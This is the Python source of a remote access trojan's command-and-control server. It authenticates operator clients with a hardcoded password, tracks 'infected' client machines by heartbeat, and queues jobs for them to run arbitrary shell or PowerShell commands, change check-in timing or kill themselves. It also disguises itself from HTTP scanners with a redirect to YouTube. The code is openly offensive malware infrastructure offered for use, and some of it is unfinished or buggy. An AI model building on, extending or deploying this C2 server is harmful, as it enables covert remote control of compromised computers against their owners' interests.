#!/bin/python3
import subprocess as sp
import socket
import threading
import time
import os
import random
import atexit
from datetime import datetime, timezone
import select
import logging
import argparse
import json

"""
Argparse settings first in order to be able to change anything
"""
parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default", required=True)
parser.add_argument('--port', help="The port to listen on", required=True)
parser.add_argument('--quiet', help="No output to console", action='store_true')


args = parser.parse_args()
ip = args.ip
port = int(args.port)
quiet = args.quiet

"""
Here's the global Debug + Logging settings. 
Global Debug print to screen will be a setting in the future
"""
if not quiet:
    global_debug = True
else:
    global_debug = False

##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s', force=True)
if global_debug:
    logging.getLogger().addHandler(logging.StreamHandler())

################
## Initial Handler
################ 
class ServerSockHandler:
    """
    Description: A class that handles the inital connections, and sends them
    to the other respective classes as needed

    """

    def __init__(self):
        logging.debug(f"===== Startup | Time (UTC) {datetime.now(timezone.utc)} =====")
        self.server_password = "1234"

        ##Errors relevant to this funtion
        self.Sx01 = "conn_broken_pipe: A pipe was broken"
        self.Sx02 = "Socket Close: The socket was successfully closed"
        self.Sx03 = "Socket Timeout: The socket timed out"
        self.Sx04 = "Socket Permission Error: You most likely don'y have permissions to open a socket"
        self.Sx05 = "Connection Refused, Reset or aborted: "
        self.Sx10 = "client_unkown_input: An unkown input was receieved from the client"

        self.SxXX = "Unkown error: "

        ## Other Values
        self.http_redirect = "https://youtube.com"
    def socket_cleanup(self):
        #pass
        try:
            self.server.close()
            logging.debug(self.Sx02)


        except Exception as e:
            logging.warning(f"{self.SxXX}:{e}")

    def start_server(self, ip, port):
        """
        Description: This is the starting point for this class, it listens for connections,
        and then delegates/sorts them based on the clients response
        """

    ##== Initial Connection (these are server values, NOT client values)
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # this allows the socket to be reelased immediatly on crash/exit
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.ADDR = (ip,port)
            self.server.bind(self.ADDR)  
            atexit.register(self.socket_cleanup)
            self.server.listen()
            logging.debug(f"[Server] Server started, and listening: {self.ADDR}")

        ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
        except TimeoutError as e:
            logging.warning(f"{self.Sx03}: \n ERRMSG: {e}\n")
        except PermissionError as e:
            logging.warning(f"{self.Sx04}: \nERRMSG:{e}\n")
        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError) as e:
            logging.warning(f"{self.Sx05}: \nERRMSG:{e}\n")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")
        

    ##== Clients & lists
        self.clients = {}
        self.current_clients = []
        
        self.friendly_current_clients = []
        self.friendly_clients = {}

    ##== Connection Loop
        while True:
            ##== Initial  handling of client 
            try:
                #logging.debug(f"Server Listening: {self.ADDR}")

                self.conn, addr = self.server.accept()

                ## Getting client id from the client, and the IP address
                self.client_remote_ip_port = f"{self.conn.getpeername()[0]}:{self.conn.getpeername()[1]}"
                logging.debug(f"[{self.client_remote_ip_port} -> Server] Accepted Connection from: {self.client_remote_ip_port}")

                ## decode THEN split
                self.response = bytes_decode(self.conn.recv(1024)).split("\\|/")
                #logging.debug(f"[{self.client_remote_ip_port} -> Server] {self.response}")
                
                ##== parsing client response
                response_list = []
                for i in self.response:
                    response_list.append(i)

            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                response_lisr = []
                logging.warning(f"Client {self.client_remote_ip_port} disconnected")

            #logging.debug(f"Parsed response from {self.client_remote_ip_port}: {response_list}")

            try:
                self.client_type = response_list[0]
                self.id = response_list[1]
                self.message = response_list[2]
                logging.debug(f"[Server] Client Established: {self.client_remote_ip_port} id={self.id}")

            except:
                ## Not setting self.id as it's first in the list, and SHOULD alwys have a value
                ## however an empty request may fool it
                self.message = "None"
                self.id = "None"
                logging.debug(f"No message, or ID value was recieved. response_list={response_list}")

            ## == Decisions based on parsed messages
            if self.client_type == "!_userlogin_!":
                try:
                    print(self.message)
                    username = self.id
                    password = self.message

                except ValueError as e:
                    username = None
                    password = None
                    logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
                    
                except Exception as e:
                    username = None
                    password = None
                    logging.debug(f"Unkown error with logon process: {e}")
                
                friendly_client_name = f"!!~{username}"

                if self.password_eval(password):
                    try:
                    ##== sending the a-ok on successful authentication
                        self.conn.send(str_encode("0"))

                        logging.debug(f"Successful Logon from: {friendly_client_name}")

                        if friendly_client_name not in self.friendly_current_clients:
                            self.friendly_current_clients.append(friendly_client_name)

                        ## Addinng the class instance with the value of friendly_client_name
                        ## to the globals so it can be called upon by name, and adding in the connection + addr
                        self.friendly_clients[friendly_client_name] = ServerFriendlyClientHandler(self.conn, self.ADDR)
                        globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]              

                    ## == Thread handler
                        friendly_thread = threading.Thread(
                            target=self.friendly_clients[friendly_client_name].friendly_client_communication,
                            args=(self.response, username)
                        )
                        friendly_thread.start()
                        logging.debug(f"Thread for object {friendly_client_name} created")

                    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                        logging.warning(f"Friendly Client {friendly_client_name} disconnected")
                    except Exception as e:
                        logging.warning(f"{self.Sx-1}:{e}")
                else:
                    self.conn.send(str_encode("1"))
                    logging.critical(f"Failed logon  from {username}, {self.client_remote_ip_port}")

##====================================== Construction ===========
            elif self.client_type == "!_client_!":
                #logging.debug(f"Message from Infected Client {self.id} recieved")

                ## peername[0] is ip, [1] is port
                ## Might want to rethink this as it may reach out to cleint again.
                ## or jsut create a self.ip and self.port
                client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id

                if client_name not in self.current_clients:
                    self.current_clients.append(client_name)
                    ## creating object intance
                    self.client = ServerMaliciousClientHandler()
                    # adding the instance self.client to the self.clients dict
                    self.clients[client_name] = self.client
                    globals()[client_name] = self.client
                
                ## creating thread for this communication
                thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
                thread.start() 
##====================================== Construction ^^^^ ===========
               

            elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                ## I should capture these too and see whos hitting it
                #self.conn.send(str_encode("<p1>403 Forbidden</p1>"))
                ## Sneaky redirect to youtube 
                self.conn.send(str_encode(f'<meta http-equiv = "refresh" content = "0; url = {self.http_redirect}" />test</meta>'))
                logging.debug("Recieved HTTP Request... redirecting to webpage")
            else:
                logging.critical(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {response_list} ")

    def password_eval(self, password=None) -> bool:
        ## decrypt pass

        _password = str(password)

        if _password == None:
            logging.debug("Password with value of 'None' passed to the password eval function")
        
        ## the else covers my ass for any potential injection/rifraff with the None parameter
        else:
            if _password == self.server_password:
                return True
            else:
                return False

################
## Friendly client
################ 
class ServerFriendlyClientHandler:
    """
    Desc:  This class is called on a per friendly client basis, and handles/stores all the data needed
    for each respective client.
    """
    def __init__(self, conn, addr):
        ## Init variables so error messages don't error out if called b4 they are assigned :)
        self.conn = conn
        self.addr = addr
        self.ip = self.addr[0]
        self.port = self.addr[1]
        self.current_client_list = None
        self.authenticated = None

        self.Sx21 = f"[Friendly Client: {self.ip}:{self.port}] conn_broken_pipe: A pipe was broken f"

    
    def friendly_client_communication(self, message, username):
        """
        This function handles the incoming messages from the friednly client,
        and directs them on where to go based on the header

        headers are: !_clientcommand_! and !_servercommand_!
            client controls a client, and server controls a server

        raw user input looks  like:
        !_clientcommand_!\|/ryan\|/set-heartbeat 69 client_127_0_0_1_UDDSZ

        """

        logging.debug(f"Friendly Client authenticated, user={username}")

        while message:
            raw_user_input = bytes_decode(self.conn.recv(1024))
            user_input = self.parse_msg_for_server(raw_user_input)         
            print(f"HERE {raw_user_input}")
            try:
                user_header = user_input[0]
                user_username = user_input[1]
                user_command= user_input[2]

                if user_header == "!_servercommand_!":
                    logging.debug("[!_servercommand_!]")
                    self.server_decision_tree(user_command)
                
                ## format that fclient needs to send(see client_decision_tree)
                ## !_servercommand_!\|/ryan\|/action value CLIENTNAME
                ##client name is always last for future compatability
                elif user_header == "!_clientcommand_!":
                    logging.debug("[!_clientcommand_!]")
                    self.client_decision_tree(user_command)
                

            except Exception as e:
                logging.debug(f"Error with username or command, input={raw_user_input}: {e}")
                break
            #message = None

################
## Server Decision tree
################ 
    def server_decision_tree(self, message):
        """
        Handles commands meant directly for the server
        """
        self.current_client_refresh()

        if message == "clients":
            if self.current_client_list != "":
                self.send_msg(self.current_client_list)
                ##== these can generate a lot of  messages very quickly, leaving disabled for now
                #logging.debug(f"[] Current Clients: {self.current_client_list}")
            else:
                self.send_msg("No Current Clients")
        
        ################
        ## Export Commands
        ## These reutrn JSON data about stuff
        ################ 
        if message == "export-clients":
            ## Expots MaliciousClients as JSON, may be a replacement to stats
            try:
                with open("server_json.json", "r+") as json_file:
                    data = json.load(json_file)
                    self.send_msg(str(data))
                    logging.debug("[Server (export-clients)]: Success")
            except Exception as e:
                logging.debug(f"[Server (export-clients)] Error with exporting client data: {e}")
                self.send_msg(f"[Server (export-clients)] Error with exporting client data: {e}")

        ## for all clients, 
        ## a  for loop might work well here
        elif message == "stats":
            pass
            """
            for i in current_client_list
                client = globals()[i]
                return_stats_list.append(client.data_list)
            """
            #data_list
            ## Need: client instance name
            ## then call: client_instance.stats
        elif message == "":
            self.send_msg("Client send nothing")
        
        
        else:
            self.client_decision_tree(message)

    def current_client_refresh(self) -> None:
        """
        Checks & adds any new clients to the self.current_client_list list
        """
        self.current_client_list = ""
        for current_client in globals():
            if current_client.startswith("client_"):
                self.current_client_list += f"{current_client}\n"


################
## Client decision tree
################ 
    """
    ## If the job is not meant for the server, it filters down to here.
    ## this interacts with the self.clients interact function, which sets jobs 
    ## for the event loop to do on heartbeats

    ## TLDR: This sets jobs or gets current data from the current selected client

    #                                       Action       Value  Target Client 
    #requests/raw messages look like this: set-heartbeat 15 client_127_0_0_1_FCECW

    ['## ==' tag meaning]:

        Static: a set command or subset of commands: ie: get-data can only use stats, or connection
            (aka rigid/less customizable)
        Dynamic: a command that can take a wide range of values, ie: set-heartbeat X, X can be any number
        
        To client/from server: where the message/command is coming from/going to
        
        validated: command is in a working state accross all 3 pieces (RAT, Server, Client)
        
        [Windows only]/[Linux only]: commands that only work on windows/limux

    """
    def client_decision_tree(self, raw_message):
        logging.debug(f"[Client Decision Tree]: {raw_message}")
        message = self.parse_msg_for_client(raw_message)
        #logging.debug(f"RawMessage={raw_message}")
        #logging.debug(f"ParsedMessage{message}")

        ## No try except due to parse_msg_for_X having builtin handling
        client_command = message[0]
        client_command_value = message[1]
        ##== Client name is always last
        client_name = message[-1]

        logging.debug(f"[client -> server] command:{client_command} value:{client_command_value} name:{client_name}")

        self.client = globals()[client_name]
        if client_name in self.current_client_list:
            pass
        else:
            logging.debug(f"[Server] Client {self.client} not found")

        ################
        ## User Interaction commands,
        ## These reutrn readable data
        ################ 
        # == Static, From Server, not validated
        if client_command == "get-data":
            if client_command_value == "stats":
                data = f"{self.client.data_list}"
                self.send_msg(data)  
            elif client_command_value == "connection":
                data = f"{self.client.conn}\n{self.client.ip}:{self.client.port}"
                self.send_msg(data)  
            elif client_command_value == "":
                self.send_msg("Please enter a data type, options are \nstats, connection")
            else:
                self.send_msg("Not a valid data type")

        # == Dynamic, To Client, not validated [missing RAT side]
        elif client_command == "set-heartbeat":
            heartbeat_value = client_command_value
            logging.debug(f"[Server: Username] Setting Heartbeat of {heartbeat_value} for {self.client}")
            
            self.client.interact("set-heartbeat", heartbeat_value)
            ## sanity check
            if self.client.current_job == f"set-heartbeat\\|/{heartbeat_value}":
                ## == Message back to client
                self.send_msg(f"Heartbeat queued to be set to: {heartbeat_value}")
                logging.debug(f"Heartbeat queued to be set to: {heartbeat_value}")   

            else:
                self.send_msg(f"Error setting heartbeat for {self.client}")
                logging.debug(f"Error setting heartbeat for {self.client}")   
        
        # == Dynamic, To Client, not validated [missing RAT side]
        ## cmd on win, bash on lin
        elif client_command == "run-command":
            ## Sending back results of command run
            self.send_msg(self.client.interact("run-command", client_command_value))
        
        # [Windows only] # == Dynamic, To Client, not validated [missing RAT side]
        elif client_command == "run-command-ps":
            self.send_msg(self.client.interact("run-command-ps", client_command_value))


        ## stats on a per client basis
        elif client_command == "stats":
            pass
        
        else:
            self.send_msg(f"Invalid job/command: {client_command}")
            logging.debug(f"Invalid job/command: {client_command}")

    def send_msg(self, message:str):
        try:
            HEADERSIZE = 10
            message = f"{len(message):<{HEADERSIZE}}" + message
            #print(message)
            #print("---head--|msg->")
            #print(f"Message being sent back to fclient: {message}")
            encoded_response = str_encode(message)
            self.conn.send(encoded_response)

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            ## nuking the class on an error... could be better.
            ##Class gets respawned on next heartbeat
            exit()

    ##== Dev Note!! These need to always return SOMETHING in their lists, 
    ## that way it's  played safely and doesnt error  out
    def parse_msg_for_server(self, raw_message) -> list:
        print(f"Raw Message: {raw_message}")  if global_debug else None
        
        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
        try:
            parsed_results_list = raw_message.split("\\|/")
        except:
            parsed_results_list = ["EMPTY","EMPTY","EMPTY"]

        return parsed_results_list
    
    def parse_msg_for_client(self, raw_message) -> list:
        #print(f"Raw Message: {raw_message}")  if global_debug else None
        
        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
        try:
            parsed_results_list = raw_message.split()
        except:
            parsed_results_list = ["EMPTY","EMPTY","EMPTY"]
        
        #print(f"Parsed Message: {parsed_results_list}") if global_debug else None
        return parsed_results_list

################
## Malicious Client Handler
################ 

## perclient & interact left
class ServerMaliciousClientHandler:
    """
    This is the class that handles all the malicious clients, a new instance is spawned for 
    each client that checks in.
    """
    def __init__(self):
        self.first_time = 0
        # setting current job to none to start
        self.current_job = None

        ## stats
        self.stats_heartbeats = 0
        self.stats_heartbeat_timer = 15
        self.stats_jobsrun = 0
        self.stats_latestcheckin = 0

        ## errors
        self.Sx12 = "[Server] A malicious client tried to connect without a valid ID:"


    def handle_client(self, conn, addr, message, id):
        
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.port = addr[1]
        self.id =  id
        
        self.data_list = [
            self.stats_heartbeats,
            self.stats_heartbeat_timer,
            self.stats_jobsrun,
            self.stats_latestcheckin
        ]

        while message:
            self.decision_tree(message)

            if not message: 
                break
            message = None
        
        ## Closing connection so a session doesn't stay established with the client
        conn.close()

    def decision_tree(self, received_msg):
        ## might be better to put the full client name/ip+id instead of just ID
        logging.debug(f"[{self.id} -> Server] MSG from Client: {received_msg}")

        if received_msg[1] == self.id:
            self.stats_heartbeats = self.stats_heartbeats + 1
            self.stats_latestcheckin = str(datetime.now(timezone.utc))
            logging.debug(f"[{self.id} -> Server] Heartbeat")
            logging.debug(f"[Server ({self.id})] Current Job: {self.current_job}")

            ## can do if msg == whatever AND this to cleanup
            if self.current_job != None:
                logging.debug(f"[Server -> {self.id}] sending {self.current_job} to {self.id}")
                ## sending job
                self.send_msg(self.current_job) 

                if self.current_job != "wait":
                    ## stats
                    self.stats_jobsrun = self.stats_jobsrun + 1  
                self.cleanup()
            else:
                self.current_job = "wait\\|/wait"
                self.send_msg(self.current_job)
        else:
            try:
                logging.critical(f"{self.Sx12} {self.id}, {self.ip}:{self.port}")
            except: 
                logging.critical(f"{self.Sx12} Info Not Available - check for any weird clients")

    def interact(self, user_input_raw, command_value=None):
        """
        This may be confusing

        This function is used for taking the friendly client input (input comes from 
        theServerSockHandler filter), and setting jobs for malicious clients. 

        diagram:
        GUI -> This function, sets self.current_job. 
        Then, client checks in, reads self.current_job, and runs it through its filters
        """
        user_input = user_input_raw.lower()

        ##  leaving jobs & descriptions out as that is handled on the logec side

        if user_input == "run-command":
            self.current_job = f"run-command\\|/{command_value}"
            return f"standin-command-results, command run: {command_value}"

        elif user_input == "wait":
            self.current_job = "wait\\|/wait"

        elif user_input == "set-heartbeat":
            #new_heartbeat = input("What is the new heartbeat? (seconds, ex 300): ")
            new_heartbeat = command_value
            self.current_job = f"set-heartbeat\\|/{int(new_heartbeat)}"

        elif user_input == "kill":
            ## add additional actions like shutdown, or crash PC in the command slot
            self.current_job = f"kill\\|/kill" 

        elif user_input == "current_job":
            pass
            ##need to  send backcurrent job
            #print(self.current_job.strip("\\|/"))
            self.send_msg(self.current_job.strip("\\|/"))

        elif user_input == "run-command-ps":
            ps_command = command_value
            self.current_job = f"run-command-ps\\|/{ps_command}"

        elif user_input == "":
            pass
            #send bacck instead of print
            #print("No input provided!")
            self.send_msg("No input provided")

        else:
            logging.debug(f"[Server (Gui -> server, setting job)] error with job setting")
            #send back as well
            #print("Job does not exist - type 'jobs' for jobs")
            self.current_job == "none"
            self.send_msg("Invalid job, type 'jobs' for jobs")
        
    def cleanup(self):
        self.current_job = "wait\\|/wait"
    
    def send_msg(self, message):
        #print(f"Message being sent to cleint: {message}") #if global_debug else None
        ##Test >1024
        try:
            self.conn.send(str_encode(message))

        except Exception as e:
            logging.debug(f"[Server ({self.id})] Error: {e}")
################
## QOL Functions
################
"""
Desc: A custom encode/decoder for things, with a format try/except block built in.
Some clients send odd characters sometimes so this is a failsafe
"""

## str -> bytes
def str_encode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]) -> bytes:
    for format in formats:
        try:
            return input.encode(format)
            logging.debug(f"Succesfully encoded bytes to {format}")
        except UnicodeEncodeError:
            logging.debug(f"Could not encode bytes to {format}")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")


## bytes -> str
def bytes_decode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]) -> str:
    for format in formats:
        try:
            return input.decode(format)
            logging.debug(f"Succesfully decoded bytes to {format}")
        except UnicodeEncodeError:
            logging.debug(f"Could not decode bytes to {format}")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")

################
## JSON & Data
################
class Data:
    """
    A handler for JSON data. This is a static class

    Current idea: Send data into it, and this function will handle the correct updating, writing, reading etc of the file.

    The raw JSON exists here so this whole thing can be one file
    """
    default_json = {
        "ServerName": "Server-Name",
        "ServerIp": "127.0.0.1",
        "MaliciousClients": [
        ],
        "FriendlyClients": [
        ]
    }
    default_malicious_client = {
        "ClientFullName": "client_127.0.0.1_DEFAULT",
        "ClientIP": "127.0.0.1",
        "ClientPort": "6969",
        "ClientId": "DEFAULT",
        "CurrentJob": "Wait",
        "SleepTime": 60,
        "LatestCheckin": "01:23:45 UTC 01/01",
        "FirstCheckin": "01:23:45 UTC 01/01",
        "Active": "No"
    }
    default_friendly_client = {
        "ClientUserName": "Bob",
        "ClientIP": "127.0.0.1",
        "ClientPort": "6969",
        "LatestLogin": "01:23:45 UTC 01/01",
        "FirstLogin": "01:23:45 UTC 01/01"
    }
    
    @staticmethod
    def json_create():
        """The default JSON file
        """
        ## needs to check if file exists
        with open("server_json.json", "w+") as json_file:
            json.dump(Data.default_json, json_file)
        
        #pass
    @staticmethod
    def json_new_client(fullname):
        """ Creates a new client section/appendage to the json data"""
        #print(type(Data.default_malicious_client))
        ## loading json
        default_malicious_client = json.loads(json.dumps(Data.default_malicious_client))
        default_malicious_client['ClientFullName'] = fullname

        #writing to json file
        with open("server_json.json", "r+") as json_file:
            data = json.load(json_file)
            #print(type(data))
            data["MaliciousClients"].append(default_malicious_client)
            json_file.seek(0)  # move file pointer to the beginning of the file
            json.dump(data, json_file)
        
        #pass

    @staticmethod
    def json_update(keyname=None, value=None, parent_key=None, client_name=None):
        """_summary_

        Args:
            keyname (string, optional): The key to edit, Defaults to None.
            value (str/int, optional): the value for the key that is being editoed. Defaults to None
            parent_key (str, optional): the parent key for the item in question (for now, MaliciousClients or FriendlyClients ). Defaults to None.
        """
        
        #pass
        with open("server_json.json", "r+") as json_file:
            data = json.load(json_file)
            #print(type(data))
            #print(data)

        #print(data['MaliciousClients'])
        
        #print(data['MaliciousClients'][0]['ClientFullName'])
        for client in data[parent_key]:
            if client['ClientFullName'] == client_name:
                logging.debug(f"[Server ({client_name})] JSON Record: Changing {keyname} to {value} from {client[keyname]}")
                ## setting respective key to value
                #print(client[keyname])
                client[keyname] = value
                break
        ## old way
        #data[parent_key][0][keyname] = value
        
        #print(data)
        
        ## write file after modification
        with open("server_json.json", "w") as json_file:
            json.dump(data, json_file)
        
        
##creating file
Data.json_create()
## example new client
Data.json_new_client('testclient')
## examle key update
Data.json_update(keyname="ClientPort", value="1234", parent_key="MaliciousClients", client_name="testclient")


s = ServerSockHandler()
s.start_server(ip, port)
logging.debug("[Server] Server Started")
